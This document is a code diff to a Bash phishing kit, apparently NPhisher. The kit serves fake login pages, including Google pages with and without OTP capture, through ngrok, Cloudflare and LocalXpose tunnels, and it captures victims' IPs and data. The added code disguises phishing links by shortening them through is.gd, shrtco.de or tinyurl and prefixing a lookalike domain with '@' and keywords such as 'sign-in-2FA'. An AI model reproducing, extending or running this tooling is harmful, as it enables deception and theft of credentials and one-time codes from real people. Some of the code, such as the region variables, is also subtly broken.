@@ -28,8 +28,6 @@ server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
 log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
-#Variables
-LINK="INVALID"
 #Normal Banner
 banner(){
 	echo " "
@@ -56,7 +54,7 @@ cbanner(){
 	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
 	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
 	echo -e "${CYAN}        ${NC} "
-	echo -e "${GREEN}                           Version 1.2 ${NC}"
+	echo -e "${GREEN}                           Version 1.3 ${NC}"
 	echo -e "${CYAN}        ${NC} "
 }
 #Small Banner
@@ -239,114 +237,6 @@ update() {
 
 }
 
-
-## Shortcut
-shortut_check() {
-	if [[ -s "/bin/nphisher" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Shortcut is active."
-	else
-		shortcut
-	fi
-}
-shortcut() {
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to setup shortcut (Y/n) : ${BLUE}" shortcut_reply
-		case $shortcut_reply in
-		Y | y)
-			shortcut_setup;;
-		N | n)
-			echo "";;
-		*)
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invaild option try again."
-			shortcut_check;;
-		esac
-}
-shortcut_setup() {
-	rm -rf /bin/nphisher
-	shortcutcmd = "pro_dir = ${pro_dir}"
-	if [[ -d '${pro_dir}' ]]; then
-		bash ${pro_dir}/nphisher.sh
-	else
-		echo -e "\n [-] NPhisher directory not found. It maybe moved or deleted try downloading NPhisher again. "
-	fi
-	echo ${shortcutcmd} >> nphisher
-	chmod 777 nphisher
-	mv nphisher /bin
-}
-
-## URL MASKING
-MASKING() { #4 last one using url shortner apis
-	RESPONSE=$(wget -nv --spider https://is.gd 2>&1 | awk '{print $5}')
-	#getting response from is.gd
-	if [[ ${RESPONSE} == "200" ]];then
-		SITE=$(curl -s https://is.gd/create.php\?format\=simple\&url=${LINK})
-		if [[ ${SITE} == https://is.gd/[-0-9a-zA-Z]* ]]; then #RE-CHECKING For a valid url somtimes site goes down!!
-			MASK_SUFfix=${SITE#https://}
-		else #as a backup shortner
-			SITE=$(curl -s https://api.shrtco.de/v2/shorten?url=${LINK} >> site.log)
-			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
-			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
-		fi
-	else
-		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Error occured while masking try again"
-		sleep 5
-		cusurl
-	fi
-	{ clear; sbanner; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} MASKED URL : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
-}
-
-checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
-	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
-		if [[  "${1::3}" != 'www' ]]; then
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
-			{ sleep 1.5; clear; banner; cusurl; }
-		fi
-	fi
-}
-
-cusurl(){
-	echo " "
-	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
-	echo " "
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
-	case $CUS_URI in
-                Y | y)
-			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
-                	checkurl ${CUS_URL}
-        	        echo " "
-	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
-                	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
-	                        MASKING
-        	        else
-                        	echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
-                	        { sleep 1.5; clear; banner; cusurl; }
-        	        fi;;
-                N | n | *)
-                        { clear; sbanner; }
-	                echo " "
-                	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
-        	        echo " ";;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
-	                { clear; banner; cusurl; }
-                esac
-}
-
-checklink() {
-	if [ ${LINK}=="" ]; then
-		clear
-		banner
-		echo " "
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
-		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
-		sleep 6
-		start_localhost
-	else
-		cusurl
-	fi
-}
-
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
@@ -398,35 +288,68 @@ ngrok_token_setup(){
         fi
 
         if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
-               rm -rf ${HOME}/.ngrok2/ngrok.yml
-               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-               authline="authtoken : ${ntoken}"
-               echo "$authline" >> ngrok.yml
-               mv ngrok.yml ${HOME}/.ngrok2/
+					rm -rf ${HOME}/.ngrok2/ngrok.yml
+					read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
+					authline="authtoken : ${ntoken}"
+					echo "$authline" >> ngrok.yml
+					mv ngrok.yml ${HOME}/.ngrok2/
         else
-               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-               echo "authtoken : ${ntoken}" >> ngrok.yml
-               mv ngrok.yml ${HOME}/.ngrok2/
+					read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
+					echo "authtoken : ${ntoken}" >> ngrok.yml
+					mv ngrok.yml ${HOME}/.ngrok2/
         fi
 	start_ngrok
+}
+ngrok_region() {
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Deafult=us):"
+				read -p "${GREEN} (Example: us eu au ap sa jp in ):" ngrokregion
+				case $nregion in
+				"us" | "US")
+					ngrokregion="us";;
+				"eu" | "EU")
+					ngrokregion="eu";;
+				"au" | "AU")
+					ngrokregion="au";;
+				"ap" | "AP")
+					ngrokregion="ap";;
+				"sa" | "SA")
+					ngrokregion="sa";;
+				"jp" | "JP")
+					ngrokregion="jp";;
+				"in" | "IN")
+					ngrokregion="in";;
+				*)
+					echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
+					sleep 5
+					ngrok_region;;
+				esac
 }
 ## Start ngrok
 start_ngrok() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
         { sleep 1; setup_site; }
+				echo -e "\n"
+				ngrokregion="us"
+        read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " reply
+				case $REPLY in
+				Y | y)
+					ngrok_region;;
+				N | n | *)
+					echo " ";;
+				esac
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
     else
-        sleep 2 && .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
     fi
-
-        { sleep 8; clear; banner; }
-##        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-	LINK="${ngrok_url}"
+	sleep 15
+	fetchlink_ngrok
 	checklink
-        capture_data_check
+}
+fetchlink_ngrok() {
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+        LINK="$ngrok_url"
 }
 
 ## Install Cloudflared
@@ -470,13 +393,13 @@ start_cloudflared() {
     else
         sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
     fi
-
-        { sleep 8; clear; banner; }
-
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	LINK="${cldflr_link}"
+	sleep 15
+	fetchlink_cloudflared
 	checklink
-        capture_data_check
+}
+fetchlink_cloudflared() {
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+        LINK="${cldflr_url}"
 }
 
 ## Install LocalXpose
@@ -541,12 +464,13 @@ start_loclx() {
 	else
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
-
-	{ sleep 12; clear; banner; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	LINK="${loclx_url}"
+	sleep 15
+	fetchlink_localxpose
 	checklink
-	capture_data_check
+}
+fetchlink_localxpose() {
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+        LINK="${loclx_url}"
 }
 
 # Download Binaries
@@ -584,7 +508,6 @@ start_localhost() {
         setup_site
         { sleep 1; clear; banner; }
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-        capture_data_check
 }
 
 #Host and port setup
@@ -613,6 +536,133 @@ setup_site() {
         cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
+#Check whether link was generated properly
+checklink() {
+	if [ -z "$LINK" ]; then
+		clear
+		banner
+		echo " "
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
+		sleep 5
+		start_localhost
+	else
+		cusurl
+	fi
+}
+
+## URL MASKING
+cusurl(){
+	clear
+	banner
+	echo " "
+	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
+	echo " "
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
+	case $CUS_URI in
+                Y | y)
+								check_netstats
+								if [ $netstats=="Online" ]; then
+									shorten_keystocks
+								else
+									echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
+									sleep 5
+									{ clear; sbanner; }
+									displaylink
+									capture_data_check
+								fi;;
+                N | n | *)
+                        { clear; sbanner; }
+												displaylink
+												capture_data_check;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
+	                { clear; banner; cusurl; }
+                esac
+}
+shorten_keystocks(){
+			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
+							checkurl ${CUS_URL}
+							echo " "
+							read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+							if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+											shorten
+							else
+											echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+											{ sleep 1.5; clear; banner; cusurl; }
+							fi
+}
+checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
+	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
+		if [[  "${1::3}" != 'www' ]]; then
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
+			{ sleep 1.5; clear; banner; cusurl; }
+		fi
+	fi
+}
+check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+shorten() {
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+		if [[ $(check_site $isgd) == 2* ]]; then
+			shorten_isgd $isgd "$LINK"
+		elif [[ $(check_site $shortcode) == 2* ]]; then
+			shorten_shortcode $shortcode "$LINK"
+		else
+			shorten_tinyurl $tinyurl "$LINK"
+		fi
+	displayshortlink
+}
+shorten_isgd() {
+	link_isgd=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_isgd_url=${link_isgd#http*//}
+	final_isgd_url="https://$processed_isgd_url"
+	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
+}
+shorten_shortcode() {
+		link_shortcode1=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+		processed_shortcode_url1=$(echo ${link_shortcode1} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+		final_shortcode_url1="https://$processed_shortcode_url1"
+		masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
+		link_shortcode2=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+		processed_shortcode_url2=$(echo ${link_shortcode2} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+		final_shortcode_url2="https://$processed_shortcode_url2"
+		masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
+		link_shortcode3=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+		processed_shortcode_url3=$(echo ${link_shortcode3} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+		final_shortcode_url3="https://$processed_shortcode_url3"
+		masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
+}
+shorten_tinyurl() {
+	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_tinyurl_url=${link_tinyurl#http*//}
+	final_tinyurl_url="https://$processed_tinyurl_url"
+	masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
+}
+
+## Display link
+displaylink(){
+	clear
+	sbanner
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}${HOST}:${PORT}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL : ${GREEN}${LINK}"
+	echo -e "\n"
+}
+displayshortlink() {
+	displaylink
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
+	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
+}
 ## Get IP address
 capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -1438,21 +1488,21 @@ esac
 }
 #google
 site_google(){
-echo -e "${BLUE}[01]${CYAN} Google new - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Google new - WITH OTP ${NC}"
+echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
+echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
-echo -e "${BLUE}[05]${CYAN} Google old- WITHOUT OTP ${NC}"
-echo -e "${BLUE}[06]${CYAN} Google old- WITH OTP ${NC}"
+echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
+echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
 case $choice in
         1 | 01)
-                website="google_new"
+                website="google"
                 tunnelmenu;;
         2 | 02)
-                website="google_new/otp"
+                website="google/otp"
                 tunnelmenu;;
         3 | 03)
                 website="google_poll"
@@ -1461,10 +1511,10 @@ case $choice in
                 website="google_poll/otp"
                 tunnelmenu;;
         5 | 05)
-                website="google"
+                website="google_old"
                 tunnelmenu;;
 	6 | 06)
-		website="google/otp"
+		website="google_old/otp"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
